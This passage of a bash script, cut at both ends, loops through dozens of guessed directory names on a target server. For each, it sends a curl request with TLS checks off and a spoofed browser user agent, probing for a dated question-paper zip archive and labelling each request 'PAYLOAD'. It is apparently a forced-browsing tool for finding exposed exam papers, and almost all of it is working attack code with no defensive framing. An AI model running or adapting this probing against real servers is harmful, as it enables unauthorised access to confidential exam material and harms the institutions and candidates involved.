${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperAccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
